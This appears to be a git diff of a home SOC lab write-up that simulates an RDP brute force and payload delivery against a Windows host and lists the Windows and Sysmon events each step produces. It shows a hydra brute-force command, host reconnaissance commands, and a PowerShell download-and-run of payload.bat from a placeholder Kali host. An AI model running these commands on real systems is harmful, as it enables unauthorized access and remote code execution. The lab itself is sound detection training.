@@ -19,6 +19,8 @@ The attack simulation began with a brute-force attack against the Windows 10 hos
 ```bash
 hydra -l LocalUser -P passwdlist.txt rdp://<Windows10-IP> -t 4 -V -f
 ```
+![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation1.png)
+
 ### Telemetry Generated
 
 - Windows Event ID 4625 – Failed Logon
@@ -35,13 +37,13 @@ xfreerdp /u:LocalUser /p:CorrectPassword /v:<WINDOWS-IP>
 
 ## 3. Initial Host Reconnaissance
 
-After successfully gaining remote access to the target system through RDP, the attacker opened a Command Prompt (cmd.exe) session and performed basic host reconnaissance to gather information about the compromised machine and its environment.
+After successfully gaining remote access to the target system through RDP, the attacker opened a PowerShell session and performed basic host reconnaissance to gather information about the compromised machine and its environment.
 
 ### Commands Executed:
 ```bash
-whoami
-hostname
-ipconfig
+whoami /all
+ipconfig /all
+tasklist
 systeminfo
 ```
 ### Telemetry Generated
@@ -56,6 +58,8 @@ After completing initial reconnaissance, the attacker prepared the payload deliv
 ```bash
 python3 -m http.server 80
 ```
+![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation2.png)
+
 This command started a simple HTTP server on the attacker's machine, making payload.bat accessible via a web browser or PowerShell download request.
 
 #### Victim Action (Windows Host):
@@ -64,6 +68,8 @@ The attacker then launched PowerShell on the compromised Windows system and down
 ```bash
 "Invoke-WebRequest -Uri http://<KALI-IP>/payload.bat -OutFile C:\Users\LocalUser\payload.bat"
 ```
+![img](https://github.com/sardar-o1/soc-investigation-lab-splunk/blob/90a98bb5875aaf7ff82af1826cdf428e40a6efd9/Screenshots/attack-simulation3.png)
+
 ### Telemetry Generated
 
 - Sysmon Event ID 1 – Process Creation
@@ -81,7 +87,6 @@ Start-Process -FilePath C:\Users\LocalUser\payload.bat
 ### Telemetry Generated
 
 - Sysmon Event ID 1 – Process Creation
-
-
-
+  
+#
 
